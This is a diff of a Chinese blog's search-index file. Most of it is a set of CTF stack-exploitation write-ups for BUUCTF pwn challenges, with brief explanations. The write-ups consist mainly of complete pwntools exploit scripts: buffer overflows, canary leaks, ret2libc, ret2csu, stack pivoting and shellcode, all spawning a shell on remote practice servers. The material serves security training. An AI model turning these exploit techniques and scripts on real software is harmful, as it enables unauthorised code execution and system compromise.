class="comment"># Local</span></span><br><span class="line"><span class="comment">#ibc = LibcSearcher(&#x27;puts&#x27;,addr)</span></span><br><span class="line"><span class="comment">#base = addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment">#system = base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#binsh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Remote</span></span><br><span class="line">base = addr - <span class="number">0x080aa0</span></span><br><span class="line">system = base + <span class="number">0x04f550</span></span><br><span class="line">binsh = base + <span class="number">0x1b3e1a</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">Payload_Canary = Padding</span><br><span class="line">io.sendline(Payload_Canary)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&#x27;</span>)</span><br><span class="line">Canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Canary: &quot;</span> + (<span class="built_in">hex</span>(Canary)))</span><br><span class="line"> </span><br><span class="line">Payload_Shell = Padding + p64(Canary) + Padding_Ret + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Try harder!&#x27;</span>,Payload_Shell)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>Padding就是上文泄露Canary的Payload</p>
-<p>Canary就是Canary的数据</p>
-<p>Padding_Ret 代表覆盖原先栈上的 RBP</p>
-<p>Ret 用来平衡栈帧</p>
-<p>Rdi 用来存放 system 的第一个函数，也就是 &#x2F;bin&#x2F;sh 字符串的地址的。</p>
-<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>from pwn import *<br>p &#x3D;remote(‘node4.buuoj.cn’,27440)<br>elf &#x3D; ELF(‘.&#x2F;ciscn_s_3’)<br>context.log_level &#x3D; ‘debug’<br>main_addr &#x3D; elf.symbols[‘main’]<br>csu_end &#x3D; 0x040059A<br>csu_front &#x3D; 0x0400580<br>ret_addr &#x3D; 0x004003a9<br>rax_59_ret &#x3D; 0x04004E2<br>syscall &#x3D; 0x0400517<br>payload &#x3D; b’&#x2F;bin&#x2F;sh\x00’ + b’A’*0x8 + p64(main_addr)<br>p.sendline(payload)<br>p.recv(0x20)<br>stack_addr &#x3D; u64(p.recv(8))<br>print(‘stack_addr–&gt;’ + hex(stack_addr))<br>binsh_addr &#x3D; stack_addr - 0x138<br>rax_59 &#x3D; binsh_addr + 0x10<br>pop_rdi &#x3D; 0x04005a3<br>payload &#x3D; b’&#x2F;bin&#x2F;sh\x00’ + b’A’*0x8 + p64(rax_59_ret) + p64(csu_end)<br>payload +&#x3D; p64(0) + p64(1) + p64(rax_59) + p64(0) + p64(0) + p64(0)<br>payload +&#x3D; p64(csu_front)<br>payload +&#x3D; b’a’*0x38<br>payload +&#x3D; p64(pop_rdi)<br>payload +&#x3D; p64(binsh_addr)<br>payload +&#x3D; p64(syscall)<br>p.sendline(payload)<br>p.interactive()</p>
-<p>‘’’<br>调用execve需要</p>
-<p>$rax&#x3D;&#x3D;59</p>
-<p>$rdi&#x3D;&#x3D;“&#x2F;bin&#x2F;sh”</p>
-<p>$rsi&#x3D;&#x3D;0</p>
-<p>$rdx&#x3D;&#x3D;0</p>
-<p>syscall</p>
-<p>def ret_csu(r12, r13, r14, r15, last):<br>    payload &#x3D; offset * ‘a’<br>    #构造栈溢出的padding<br>    payload +&#x3D; p64(first_csu) + ‘a’ * 8<br>    #gadgets1的地址<br>    payload +&#x3D; p64(0) + p64(1)<br>    #rbx&#x3D;0, rbp&#x3D;1<br>    payload +&#x3D; p64(r12)<br>    #call调用的地址<br>    payload +&#x3D; p64(r13) + p64(r14) + p64(r15)<br>    #三个参数的寄存器<br>    payload +&#x3D; p64(second_csu)<br>    #gadgets2的地址<br>    payload +&#x3D; ‘a’ * 56<br>    #pop出的padding<br>    payload +&#x3D; p64(last)<br>    #函数最后的返回地址<br>    return payload</p>
-<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>‘’’<br>调试脚本</p>
-<p>from pwn import *<br>context(log_level &#x3D; ‘debug’,os&#x3D;’linux’,arch&#x3D;’i386’)<br>p &#x3D; process(‘.&#x2F;ez’)<br>gdb.attach(p)<br>p.recvuntil(‘crash: ‘)<br>stack_addr &#x3D; int(p.recv(10), 16)<br>payload &#x3D; b’crashme\x00’ + b’a’*18<br>payload +&#x3D; p32(0) + asm(shellcraft.sh())<br>p.recvuntil(‘&gt; ‘)<br>p.sendline(payload)<br>pause()<br>p.interactive()<br>‘’’<br>#coding&#x3D;utf-8<br>from pwn import *<br>context.log_level &#x3D; ‘debug’<br>p&#x3D;remote(‘node4.buuoj.cn’,25049)<br>shellcode &#x3D; asm(shellcraft.sh())<br>p.recvuntil(‘lets crash: ‘)<br>stack_addr &#x3D; int(p.recv(10),16)<br>shellcode_addr &#x3D; stack_addr-28<br>payload &#x3D; b’crashme\x00’.ljust(26,b”\x00”)<br>payload +&#x3D; p32(shellcode_addr)+shellcode<br>p.recvuntil(‘&gt;’)<br>p.sendline(payload)<br>p.interactive()</p>
-<h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h2><p>from pwn import *<br>context(os&#x3D;’linux’,arch&#x3D;’i386’,log_level&#x3D;’debug’)<br>p&#x3D;remote(‘node4.buuoj.cn’,27550)<br>elf&#x3D;ELF(‘.&#x2F;rop_chain’)<br>flag_addr&#x3D;elf.symbols[‘flag’]<br>win1_addr&#x3D;elf.symbols[‘win_function1’]<br>win2_addr&#x3D;elf.symbols[‘win_function2’]<br>win2_a1&#x3D;0xBAAAAAAD#-1163220307十六进制补码<br>flag_a1&#x3D;0xDEADBAAD#-559039827十六进制补码<br>payload&#x3D;b’a’*(0x18+4)+p32(win1_addr)+p32(win2_addr)+p32(flag_addr)+p32(win2_a1)+p32(flag_a1)<br>p.sendline(payload)<br>p.interactive()</p>
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>刷题</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>GNU Makefile编译C/C++(Linux系统、VSCODE)</title>
     <url>/2023/04/17/GNU-Makefile%E7%BC%96%E8%AF%91C-C-Linux%E7%B3%BB%E7%BB%9F%E3%80%81VSCODE/</url>
     <content><![CDATA[<p><a href="https://github.com/liheqian1993/GNC-Tutorial">文章改动</a></p>
@@ -398,6 +296,126 @@
       </tags>
   </entry>
   <entry>
+    <title>pwn栈刷题记录</title>
+    <url>/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="栈问题"><a href="#栈问题" class="headerlink" title="栈问题"></a>栈问题</h1><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p><strong>checksec</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">gets</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x308CD64F</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = <span class="built_in">getc</span>(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="type">char</span>)v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = <span class="built_in">getc</span>(v2);</span><br><span class="line">        v4 = (<span class="type">char</span>)v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>get_flag()有两个参数，a1和a2。这里我已经将a1和a2转换成了十六进制。if对a1和a2进行了一个判断，符合条件后进行对flag的读取。具体读取过程为：首先v2对flag.txt文件进行一个读取，v3用getc()来接收v2读取的值(getc():从指定的流stream获取下一个字符(一个无符号字符)，并把位置标识符往前移动)。在v3不为255时，将值传给v4，用中间变量v5来读取v2的值，并且在v5不为255时，将v5的值赋给v4并输出v4，最终输出的结果就是flag</p>
+<p>但是我们发现通过main()的stackoverflow单纯的跳到get_flag()这个函数是无法拿到flag的，这里是因为我们在stackoverflow时覆盖了a1和a2，破坏了输出flag的条件，从而无法得到flag。我们试想，如果我们在stackoverflow时保护了栈结构，使程序达到输出flag的条件，正常退出，是否就可以拿到flag？</p>
+<p>于是我们需要<code>exit()</code>的地址，以及满足条件的a1和a2的值，即<code>0x308CD64F</code>和<code>0x195719D1</code></p>
+<p><strong>exp</strong></p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span> , arch = <span class="string">&quot;i386&quot;</span> , log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27026</span>)</span><br><span class="line">ret = <span class="number">0x08048196</span></span><br><span class="line">exits = elf.sym[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;got exit addr : %s&quot;</span> % <span class="built_in">hex</span>(exits))</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x38</span> + p32(<span class="number">0x080489A0</span>) + p32(exits) + p32(<span class="number">0x308CD64F</span>)+ p32(<span class="number">0x195719D1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Qual a palavrinha magica? &quot;</span> , timeout = <span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>先checksec一下，nx排除了shellcode的可能，Full RELEO为地址随机化</p>
+<p>先观察主函数，设定了一个闹钟(但是这道题不需要使用解除闹钟的方法)</p>
+<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095347-1678706371578-4.png"></p>
+<p>主函数的思路是生成一个随机数，把这个随机数作为参数传进sub——804871F()函数中，然后再将函数返回结果作为参数传进sub——80487D0()里,sub_80486bb()是初始化，没什么用。<strong>fd&#x3D;open(“&#x2F;dev&#x2F;urandom”,0);if(fd&gt;0) read(fd,&amp;buf,4u)</strong>:获取一个随机数给到buf</p>
+<p><strong>sub_804871f()</strong></p>
+<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095410.png"></p>
+<p>sprintf函数将生成的随机数加到s[32]的数组中，这里题目有read函数，但是没有栈溢出的可能，读入buf之后，读取buf的长度，然后比较buf和s字符串的大小（比较长度为前v1个字符）。此时如果strncmp（）的结果不为0，则直接退出程序。因此我们第一个目的：<strong>使strncmp结果为0</strong></p>
+<p><strong>sub_80487d0()</strong></p>
+<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095400.png"></p>
+<p>这个函数将buf[7]作为参数出传进来，将它的ASCII码比对，看到全程序中唯一一个存在栈溢出漏洞可能性的地方。但是必须满足a1的ASCII码值能达到栈溢出的大小。第二个目的：<strong>使a1的ASCII码值（sub_804871F()函数里的buf[7]的ASCII码值尽量大）</strong></p>
+<p><strong>思路</strong></p>
+<p>使用ROP链寻找libc解题</p>
+<p>首先让strncmp结果为零，当buf与s数组完全相同时，strncmp结果会为0，但是s为系统生成的随机数，而buf是我们输入的数据，两者显然不可能相等。另一种办法就是<strong>使v1等于0，这样strncmp的结果仍为0。</strong>而v1是strlen函数读取buf的长度大小，使他为0就很简单了，标准的长度检测绕过，让buf数组的第一位为<strong>‘\x00’</strong>即可。此时程序不会退出</p>
+<p>然后让buf[7]的值尽可能大，要实现栈溢出，buf[7]元素的ASCII码值必须大于两百四十多才行，所以要使用转义字符的ASCii码，’&#39;为转义字符，而’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为255的符号。</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25352</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]<span class="string">&#x27;&#x27;&#x27;选择用write函数泄露libc地址&#x27;&#x27;&#x27;</span></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">main_func = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&quot;\x00&quot;</span>长度检测绕过+ <span class="string">b&quot;\xff&quot;</span>*<span class="number">7</span>让buf[<span class="number">7</span>]的值尽可能大,\为转义字符，而’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为<span class="number">255</span>的符号。</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line">payload2 = flat([<span class="string">b&quot;a&quot;</span>*<span class="number">0xE7</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">4</span>,write_plt,main_func,<span class="number">1</span>,read_got,<span class="number">0x8</span>])</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(read_addr)</span><br><span class="line">libcbase = read_addr - libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"><span class="comment">#print libcbase</span></span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(binsh)</span><br><span class="line">payload3 = flat([<span class="string">b&quot;a&quot;</span>*<span class="number">0xe7</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">4</span>,system_addr,<span class="number">0</span>,binsh])</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>
+
+<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>简单的rop</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r= remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27435</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./level2_x64&quot;</span>)</span><br><span class="line">sys_addr=elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x4006b3</span></span><br><span class="line">bin_sh=<span class="number">0x600a90</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi_addr)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>from pwn import *<br>from LibcSearcher import *<br>context(os&#x3D;’linux’, arch&#x3D;’amd64’, log_level&#x3D;’debug’)<br>ret &#x3D; 0x4006b9      #靶机是ubuntu，所以需要栈平衡<br>elf &#x3D; ELF(‘pwn1’)<br>puts_plt &#x3D; elf.plt[“puts”]<br>puts_got &#x3D; elf.got[‘puts’]<br>main_addr &#x3D; elf.symbols[“main”]<br>pop_rdi_ret &#x3D; 0x400c83      #×64程序基本都存在的一个地址pop rdi；ret<br>p &#x3D; remote(‘node4.buuoj.cn’,25016)<br>payload &#x3D; b’a’ * (0x50 + 8)<br>payload &#x3D; payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>    print(payload)<br>p.sendlineafter(‘Input your choice!\n’, ‘1’)<br>p.sendlineafter(‘Input your Plaintext to be encrypted\n’, payload)<br>p.recvuntil(‘Ciphertext\n’)	<br>p.recvline()<br>puts_addr &#x3D; u64(p.recv(7)[:-1].ljust(8,b’\x00’))<br>print(puts_addr)      #找出puts的地址<br>libc &#x3D; LibcSearcher(‘puts’, puts_addr)<br>libc_base   &#x3D; puts_addr - libc.dump(‘puts’)      #找出函数地址偏移量<br>system_addr &#x3D; libc_base + libc.dump(‘system’)      #计算出system的在程序中的地址<br>binsh_addr  &#x3D; libc_base + libc.dump(‘str_bin_sh’)	<br>payload &#x3D; b’a’ * (0x50 + 8)<br>payload &#x3D; payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br>p.sendlineafter(‘Input your choice!\n’, ‘1’)<br>p.sendlineafter(‘Input your Plaintext to be encrypted\n’, payload)<br>p.interactive()</p>
+<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>from pwn import *<br>elf &#x3D; ELF(“.&#x2F;not_the_same_3dsctf_2016”)<br>io &#x3D; remote(“node4.buuoj.cn”,28787)<br>io &#x3D; process(“.&#x2F;not_the_same_3dsctf_2016”)<br>backdoor_addr &#x3D; 0x080489A0<br>str_flag_addr &#x3D; 0x080ECA2D<br>printf_addr &#x3D; 0x0804F0A0<br>write_addr &#x3D; elf.symbols[‘write’]<br>exit_addr &#x3D; elf.symbols[‘exit’]<br>print(hex(write_addr))<br>这个main函数没有push ebp 所以不用再覆盖4字节的ebp<br>payload &#x3D; 0x2D * b’a’ + p32(backdoor_addr) + p32(write_addr) + p32(exit_addr) + p32(1) + p32(str_flag_addr) + p32(45)#覆盖了栈，没有覆盖ebp，原因是不存在ebp，字符串空间的底部就是函数的返回地址覆盖返回地址，返回到get_secret函数从get_secret函数返回到write函数#exit位置是write的返回的值，没什么用，随便填<br>payload +&#x3D; p32(1)           # write函数的第一个参数，是 文件描述符；<br>payload +&#x3D; p32(flagaddr)    # write函数的第二个参数，是 存放字符串的内存地址；<br>payload +&#x3D; p32(42)          # write函数的第三个参数，是 打印字符串的长度<br>io.sendline(payload)<br>io.interactive()<br>io.close()</p>
+<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>from pwn import *<br>context(os&#x3D;’linux’,arch&#x3D;’amd64’,log_level&#x3D;’debug’)<br>elf &#x3D; ELF(“.&#x2F;pwn4”)<br>p &#x3D; remote(‘node4.buuoj.cn’,25661)<br>shellcode&#x3D;asm(shellcraft.sh())<br>p.sendlineafter(‘name\n’,shellcode)<br>payload&#x3D;flat(b’a’*0x28+p64(0x601080))<br>p.sendlineafter(‘me?\n’,payload)<br>p.interactive()</p>
+<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>#encoding &#x3D; utf-8<br>from pwn import *<br>from LibcSearcher import *<br>context(os &#x3D; ‘linux’,arch &#x3D; ‘i386’,log_level &#x3D; ‘debug’)<br>elf &#x3D; ELF(‘.&#x2F;2018_rop’)<br>p &#x3D; remote(‘node4.buuoj.cn’,25020)<br>main_addr      &#x3D; elf.sym[‘main’]<br>plt_write_addr &#x3D; elf.plt[‘write’]<br>got_write_addr &#x3D; elf.got[‘write’]<br>payload        &#x3D; b’a’<em>(0x88+0x4) + p32(plt_write_addr) + p32(main_addr) + p32(1) + p32(got_write_addr) + p32(4)<br>p.sendline(payload)<br>write_addr     &#x3D; u32(p.recv(4))<br>print(hex(write_addr))<br>lib             &#x3D; LibcSearcher(‘write’,write_addr)<br>lib_write_addr  &#x3D; lib.dump(‘write’)<br>lib_system_addr &#x3D; lib.dump(‘system’)<br>lib_bin_addr    &#x3D; lib.dump(‘str_bin_sh’)<br>base_addr       &#x3D; write_addr - lib_write_addr<br>system_addr     &#x3D; base_addr  + lib_system_addr<br>bin_addr 	&#x3D; base_addr  + lib_bin_addr<br>payload &#x3D; b’a’</em>(0x88+0x4) + p32(system_addr) + b’aaaa’ + p32(bin_addr)<br>p.sendline(payload)<br>p.interactive()</p>
+<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><p>from pwn import*<br>from LibcSearcher import *<br>context.log_level&#x3D;’debug’<br>r&#x3D;remote(‘node4.buuoj.cn’,28646)<br>elf&#x3D;ELF(‘.&#x2F;pwn6’)<br>main_addr&#x3D;elf.sym[‘main’]<br>puts_plt&#x3D;elf.plt[‘puts’]<br>puts_got&#x3D;elf.got[‘puts’]<br>pop_ret&#x3D;0x400733<br>payload1&#x3D;b’a’*0x28+p64(pop_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</p>
+<p>这里需要注意一下payload64位先往寄存器中传参顺序要注意！！！<br>r.recvuntil(“Pull up your sword and tell me u story!”)<br>r.sendline(payload1)<br>r.recv()<br>puts_addr&#x3D;u64(r.recv(6).ljust(8,b’\x00’))<br>libc&#x3D;LibcSearcher(‘puts’,puts_addr)<br>libc_base &#x3D; puts_addr - libc.dump(‘puts’)<br>system &#x3D; libc_base+libc.dump(‘system’)<br>bins &#x3D; libc_base+libc.dump(‘str_bin_sh’)<br>payload2&#x3D;b’A’*0x28+p64(pop_ret)+p64(bins)+p64(system)<br>r.recvuntil(“Pull up your sword and tell me u story!”)<br>r.sendline(payload2)<br>r.interactive()</p>
+<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><p>from pwn import*<br>elf&#x3D;ELF(‘pwn7’)<br>r&#x3D;remote(‘node4.buuoj.cn’,28553)<br>back_addr&#x3D;elf.symbols[‘backdoor’]<br>r.recv()<br>r.sendline(b’-1’)<br>payload&#x3D;b’a’*(0x10+8)+p64(back_addr)<br>r.sendline(payload)<br>r.interactive()</p>
+<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>from pwn import *<br>context(os&#x3D;”linux”,arch&#x3D;”i386”,log_level&#x3D;”debug”)<br>elf&#x3D;ELF(‘pwn8’)<br>p&#x3D;remote(‘node4.buuoj.cn’,29794)<br>sys_addr&#x3D;0x08048400<br>leave_addr&#x3D;0x8048562<br>payload1&#x3D;b’a’*0x27<br>p.sendlineafter(‘name?\n’,payload1)<br>p.recvuntil(‘\n’)<br>ebp&#x3D;u32(p.recv(4))<br>payload2&#x3D;b’a’*4+p32(sys_addr)+p32(0)+p32(ebp-0x28)+b’&#x2F;bin&#x2F;sh’<br>payload2&#x3D;payload2.ljust(0x28,b’\0’)<br>payload2+&#x3D;p32(ebp-0x38)看当时的ebp+p32(leave_addr)<br>p.sendline(payload2)<br>p.interactive()</p>
+<h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><p>整数溢出问题<br>from pwn import*<br>from LibcSearcher import*<br>p&#x3D;remote(‘node4.buuoj.cn’,29476)<br>elf&#x3D;ELF(‘.&#x2F;pwn9’)<br>printf_plt&#x3D;elf.plt[‘printf’]<br>printf_got&#x3D;elf.got[‘printf’]<br>vuln&#x3D;0x0804852f<br>main&#x3D;0x080485b8<br>p.recvuntil(‘read?’)<br>p.sendline(str(-1))<br>p.recvuntil(‘data!\n’)<br>payload&#x3D;b’a’*0x30+p32(printf_plt)+p32(vuln)+p32(printf_got)<br>p.sendline(payload)<br>p.recvuntil(‘\n’)<br>printf_add&#x3D;u32(p.recv(4))<br>print(hex(printf_add))<br>libc&#x3D;LibcSearcher(‘printf’,printf_add)<br>libc_base&#x3D;printf_add-libc.dump(‘printf’)<br>system&#x3D;libc_base+libc.dump(‘system’)<br>binsh&#x3D;libc_base+libc.dump(‘str_bin_sh’)<br>p.recvuntil(‘read?’)<br>p.sendline(str(-1))<br>p.recvuntil(‘data!\n’)<br>payload&#x3D;b’a’*0x30+p32(system)+p32(main)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()</p>
+<h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><p>32位ret2libc<br>from pwn import *<br>from LibcSearcher import *<br>context.log_level &#x3D; ‘debug’<br>conn &#x3D; remote(‘node4.buuoj.cn’,25837)<br>elf &#x3D; ELF(‘.&#x2F;level3’)<br>write_plt &#x3D; elf.plt[‘write’]<br>write_got &#x3D; elf.got[‘write’]<br>main_addr &#x3D; 0x0804844B<br>payload &#x3D; b’a’*0x88 + b’b’*4 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)<br>conn.sendlineafter(“Input:\n”,payload)<br>write_addr &#x3D; u32(conn.recv(4))<br>print(hex(write_addr))<br>libc &#x3D; LibcSearcher(‘write’,write_addr)<br>libc_base &#x3D; write_addr - libc.dump(‘write’)<br>system_addr &#x3D; libc_base + libc.dump(‘system’)<br>bin_sh &#x3D; libc_base + libc.dump(‘str_bin_sh’)<br>payload &#x3D; b’a’*0x88 + b’b’*4 + p32(system_addr) + p32(main_addr) + p32(bin_sh)<br>conn.sendlineafter(“Input:\n”,payload)<br>conn.interactive()</p>
+<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><p>from pwn import *</p>
+<p>#start<br>r &#x3D; remote(‘node4.buuoj.cn’,25683)<br>r &#x3D; process(“..&#x2F;buu&#x2F;[HarekazeCTF2019]baby_rop2”)<br>elf &#x3D; ELF(‘babyrop2’)<br>libc &#x3D; ELF(“libc.so.6”)</p>
